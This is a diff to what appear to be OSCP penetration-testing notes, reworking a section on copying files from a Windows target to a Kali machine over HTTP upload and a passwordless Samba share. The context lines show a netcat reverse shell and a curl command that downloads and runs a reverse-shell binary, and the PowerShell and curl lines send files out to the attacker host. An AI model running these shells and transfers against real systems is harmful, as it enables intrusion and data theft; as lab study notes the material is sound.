@@ -89,11 +89,13 @@ nc -nv 192.168.17.10 4444 -e /bin/sh
 curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf
 ```
 
-# 4. Uploading files to Kali
+# 4. Uploading files from Windows to Kali
 
-## 4.1. Setup upload page on web server
+## 4.1. HTTP
 
-### Prepare uploads directory
+### 4.1.1. Setup upload page on web server
+
+#### Prepare uploads directory
 
 ```console
 mkdir /var/www/html/uploads
@@ -102,7 +104,7 @@ chown www-data:www-data /var/www/html/uploads
 
 ☝️ apache2 runs as `www-data` user, it needs write permission on the uploads directory for uploads to succeed
 
-### Prepare upload page
+#### Prepare upload page
 
 ```console
 curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/main/upload.php
@@ -110,9 +112,37 @@ curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/
 
 ☝️ The name for the upload parameter is named as default of `file` to accommodate the PowerShell `UploadFile` method of `System.Net.WebClient` which will `POST` the file to this name
 
-## 4.2. Uploading
+### 4.1.2. Uploading
 
 |   |   |
 |---|---|
 |PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')`|
 |cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php`|
+
+## 4.2. SMB
+
+### 4.2.1. [Create a passwordless guest share in Samba](https://www.techrepublic.com/article/how-to-create-a-passwordless-guest-share-in-samba/)
+
+```console
+sed -i '/;   interfaces/a interfaces = eth0' /etc/samba/smb.conf
+sed -i '/;   bind interfaces only = yes/a bind interfaces only = yes' /etc/samba/smb.conf
+mkdir /home/share
+chmod -R ugo+w /home/share
+cat << EOF >> /etc/samba/smb.conf
+[public]
+path = /home/share
+public = yes
+guest ok = yes
+writable = yes
+force create mode = 0666
+force directory mode = 0777
+browseable = yes
+EOF
+systemctl enable --now smbd
+```
+
+### 4.2.2. Copy
+
+```cmd
+copy "The Little Prince.jpg" \\kali.vx\public\
+```
